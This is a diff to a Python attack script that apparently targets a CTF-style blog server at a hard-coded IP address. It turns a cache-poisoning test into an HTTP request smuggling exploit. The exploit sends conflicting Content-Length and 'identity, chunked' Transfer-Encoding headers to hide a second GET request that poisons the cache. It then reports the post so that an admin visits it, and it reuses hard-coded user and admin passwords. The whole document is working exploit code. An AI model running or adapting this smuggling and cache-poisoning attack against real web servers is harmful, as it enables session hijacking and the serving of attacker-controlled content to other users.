@@ -1,11 +1,9 @@
 import requests
 import time
-import json
 
 SERVER_URL = "http://54.198.62.41"
 
 def login_user(username, password):
-    """Login and get JWT token"""
     login_data = {
         "username": username,
         "password": password
@@ -13,58 +11,98 @@ def login_user(username, password):
     r = requests.post(f"{SERVER_URL}/api/auth/login", json=login_data)
     return r.json()['token']
 
-def test_cache_poison():
+def smuggle_request():
     # Get user token
     user_token = login_user("user", "user123")
     print(f"\nUser token obtained: {user_token[:20]}...")
 
-    # Try caching with explicit path in header
-    print("\nAttempting cache poison with explicit path...")
+    # Create main request
+    content = "X" * 5  # 5 bytes
+    
+    # Create smuggled request to poison cache
+    smuggled = (
+        "GET /api/blog/post/1 HTTP/1.1\r\n"
+        f"Host: localhost\r\n"
+        "Content-Type: application/json\r\n"
+        "X-Special-Key: secret_cache_key\r\n"
+        f"Authorization: Bearer {user_token}\r\n"
+        "\r\n"
+    )
+
+    # Combine with proper chunked encoding
+    body = (
+        content +  # First chunk
+        "\r\n0\r\n\r\n" +  # End chunk marker
+        smuggled  # Smuggled request
+    )
+
+    print("\nSending smuggled request...")
+    headers = {
+        'Host': 'localhost',
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'Content-Length': '5',
+        'Transfer-Encoding': 'identity, chunked',
+        'Connection': 'keep-alive',
+        'X-Special-Key': 'secret_cache_key',
+        'Authorization': f'Bearer {user_token}'
+    }
+
+    try:
+        r = requests.post(
+            f"{SERVER_URL}/api/blog/post/1",
+            headers=headers,
+            data=body,
+            allow_redirects=False
+        )
+        print(f"Initial status: {r.status_code}")
+        print(f"Headers: {dict(r.headers)}")
+    except Exception as e:
+        print(f"Error: {e}")
+
+    # Quick check if cache is poisoned
+    print("\nChecking cache status...")
+    headers = {
+        'Host': 'localhost',
+        'X-Special-Key': 'secret_cache_key',
+        'Authorization': f'Bearer {user_token}'
+    }
+
+    r = requests.get(
+        f"{SERVER_URL}/api/blog/post/1",
+        headers=headers
+    )
+    print(f"Cache check status: {r.status_code}")
+    print(f"Cache-Control: {r.headers.get('Cache-Control')}")
+
+    # Report the post to trigger admin visit
+    print("\nReporting post...")
     headers = {
         'Authorization': f'Bearer {user_token}',
-        'X-Special-Key': 'secret_cache_key',
-        'Host': 'localhost',
-        'Accept': 'application/json'
+        'Content-Type': 'application/json'
     }
-    
-    # First request to cache
-    cache_resp = requests.get(
-        f"{SERVER_URL}/api/blog/post/1", 
-        headers=headers
+    data = {"postId": 1}
+    r = requests.post(
+        f"{SERVER_URL}/api/blog/report",
+        headers=headers,
+        json=data
     )
-    print("\nCache attempt response:")
-    print(f"Status: {cache_resp.status_code}")
-    print(f"Headers:\n{json.dumps(dict(cache_resp.headers), indent=2)}")
-    print(f"Content preview: {cache_resp.text[:200]}")
-    
-    # Wait a moment
-    print("\nWaiting 2 seconds...")
-    time.sleep(2)
-    
-    # Try admin access
-    admin_token = login_user("admin", "admin123")
-    headers = {
-        'Authorization': f'Bearer {admin_token}',
-        'X-Special-Key': 'secret_cache_key',
-        'Host': 'localhost',
-        'Accept': 'application/json'
-    }
-    
-    print("\nTrying admin access to cached content...")
-    admin_resp = requests.get(
-        f"{SERVER_URL}/api/blog/post/1", 
-        headers=headers
-    )
-    print(f"\nAdmin response:")
-    print(f"Status: {admin_resp.status_code}")
-    print(f"Headers:\n{json.dumps(dict(admin_resp.headers), indent=2)}")
-    print(f"Content preview: {admin_resp.text[:200]}")
+    print(f"Report status: {r.status_code}")
 
-    # Compare responses
-    print("\nResponse comparison:")
-    print(f"Same content: {cache_resp.text == admin_resp.text}")
-    print(f"Cache headers match: {cache_resp.headers.get('Cache-Control') == admin_resp.headers.get('Cache-Control')}")
+    # Check if admin viewed it
+    print("\nChecking admin response...")
+    headers = {
+        'Host': 'localhost',
+        'X-Special-Key': 'secret_cache_key',
+        'Authorization': f'Bearer {user_token}'
+    }
+    r = requests.get(
+        f"{SERVER_URL}/api/blog/post/1",
+        headers=headers
+    )
+    print(f"Final check status: {r.status_code}")
+    print(f"Final Cache-Control: {r.headers.get('Cache-Control')}")
+    print(f"Content: {r.text[:200]}")
 
 if __name__ == "__main__":
-    print("Starting modified cache test...")
-    test_cache_poison()
+    print("Starting smuggle + cache test...")
+    smuggle_request()
